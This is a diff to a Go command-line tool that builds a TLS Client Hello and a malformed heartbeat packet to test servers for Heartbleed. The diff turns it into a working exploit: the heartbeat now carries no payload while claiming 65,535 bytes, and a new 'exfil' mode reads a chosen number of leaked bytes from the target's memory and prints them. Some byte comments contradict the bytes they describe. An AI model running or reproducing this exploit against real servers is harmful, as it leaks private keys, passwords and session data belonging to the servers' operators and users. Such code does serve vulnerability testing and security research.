@@ -1,6 +1,7 @@
 package main
 
 import (
+	"errors"
 	"fmt"
 	"io"
 	"net"
@@ -38,14 +39,14 @@ func main() {
 		pterm.Info.Printf("Initializing TLS client . . .\n")
 		server := fmt.Sprintf("%s:%d", argv.Server, argv.Port)
 		conn, err := net.Dial("tcp", server)
-		defer conn.Close()
 		if err != nil {
 			pterm.Error.Printf("Unable to connect to server at %s, err : %s\n", server, err.Error())
 			return nil
 		}
+		defer conn.Close()
 
 		clientHelloMsg := []byte{
-			0x16, 0x03, 0x02, 0x00, 0x36, // Content type = 16 (handshake message); Version = 03 02; Packet length = 00 36
+			0x16, 0x03, 0x02, 0x00, 0x36, // Content type = 16 (handshake message); Version = 03 03; Packet length = 00 36
 			0x01, 0x00, 0x00, 0x32, // Message type = 01 (client hello); Length = 00 00 32
 			0x03, 0x02, // Client version = 03 02 (TLS 1.1)
 			0x50, 0x0b, 0xaf, 0xbb, 0xb7, 0x5a, 0xb8, 0x3e, 0xf0, 0xab, 0x9a, 0xe3, 0xf3, 0x9c, 0x63, 0x15,
@@ -60,31 +61,9 @@ func main() {
 		}
 
 		heartbleedPacket := []byte{
-			0x18, 0x03, 0x02, 0x00, 0x29, // Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
+			0x18, 0x03, 0x02, 0x00, 0x03, // Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
 			0x01, 0xff, 0xff, // Heartbeat message type = 01 (request); Payload length = FF FF
-			0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
-			0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
-			0x41, 0x41, 0x41, 0x41, 0x41, 0x42, 0x43, 0x44,
-			0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
-			0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
-			0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
-			0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
-			0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
-			0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
-			0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
-			0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
-			0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
-			0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
-			0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
-			0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
-			0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
-			0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
-			0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
-			0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
-			0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
-			0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
-			0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
-			0x4E, 0x4F,
+			// Missing a message that is supposed to be FF FF bytes long
 		}
 
 		pterm.Info.Printf("Sending Client Hello . . .\n")
@@ -99,14 +78,17 @@ func main() {
 			_, err = io.ReadFull(conn, recvTLSHeaderBuf)
 			if err != nil {
 				pterm.Error.Println("read error:", err)
+				return err
 			}
 			contentType := recvTLSHeaderBuf[0]
 			if contentType != 0x16 {
 				pterm.Error.Printf("Wrong content type received for Server Hello, expecting 22 got %v\n", contentType)
+				return errors.New("wrong content type received for Server Hello")
 			}
 			tlsVersion, _ := convertToInt(recvTLSHeaderBuf[1:3])
 			if tlsVersion != 770 {
 				pterm.Error.Printf("Wrong version received for Server Hello, expecting 770 (TLS 1.1) got %v\n", contentType)
+				return errors.New("wrong version received for Server Hello")
 			}
 			length, _ := convertToInt(recvTLSHeaderBuf[3:])
 			pterm.Info.Printf("Received message : type = %v, ver = %v, length = %v\n", contentType, tlsVersion, length)
@@ -115,6 +97,7 @@ func main() {
 			_, err = io.ReadFull(conn, recvPayloadBuf)
 			if err != nil {
 				pterm.Error.Println("read error:", err)
+				return err
 			}
 		}
 		pterm.Info.Printf("Successfully received all packets for Server Hello\n")
@@ -123,35 +106,38 @@ func main() {
 		_, err = conn.Write(heartbleedPacket)
 		if err != nil {
 			pterm.Error.Printf("Unable to send heartbeat, err : %s\n", err.Error())
-			return nil
+			return err
 		}
 		recvHeartbeatRespHeaderBuf := make([]byte, 5)
 		_, err = io.ReadFull(conn, recvHeartbeatRespHeaderBuf)
 		if err != nil {
 			pterm.Error.Println("read error:", err)
+			return err
 		}
 		contentType := recvHeartbeatRespHeaderBuf[0]
 		tlsVersion, _ := convertToInt(recvHeartbeatRespHeaderBuf[1:3])
-		if tlsVersion != 770 {
-			pterm.Warning.Printf("Wrong version received for Server Hello, expecting 770 (TLS 1.1) got %v\n", contentType)
-		}
 		length, _ := convertToInt(recvHeartbeatRespHeaderBuf[3:])
 		pterm.Info.Printf("Received message : type = %v, ver = %v, length = %v\n", contentType, tlsVersion, length)
-		if contentType == 0x15 {
+		if length > 3 || contentType == 0x18 { // Server did responded with something
+			pterm.Warning.Printfln("Server returned more data than it should or server did processed malformed heartbeat request - server is vulnerable!")
+			if argv.Mode == "exfil" {
+				pterm.Warning.Printfln("Dumping %v bytes from response:", argv.Bytes)
+				recvHeartbeatRespPayloadBuf := make([]byte, argv.Bytes)
+				_, err = io.ReadFull(conn, recvHeartbeatRespPayloadBuf)
+				if err != nil {
+					pterm.Error.Println("read error:", err)
+					return err
+				}
+				fmt.Println(string(recvHeartbeatRespPayloadBuf))
+
+			}
+		} else {
 			pterm.Success.Prefix = pterm.Prefix{
 				Text:  "INFO",
 				Style: pterm.NewStyle(pterm.BgGreen),
 			}
-			pterm.Success.Printf("got %v (Alert) as content type, this server is likely to be secure\n", contentType)
-			return nil
+			pterm.Success.Println("No response received, server likely not vulnerable")
 		}
-
-		recvHeartbeatRespPayloadBuf := make([]byte, length)
-		_, err = io.ReadFull(conn, recvHeartbeatRespPayloadBuf)
-		if err != nil {
-			pterm.Error.Println("read error:", err)
-		}
-		fmt.Println(string(recvHeartbeatRespPayloadBuf))
 
 		return nil
 	}))
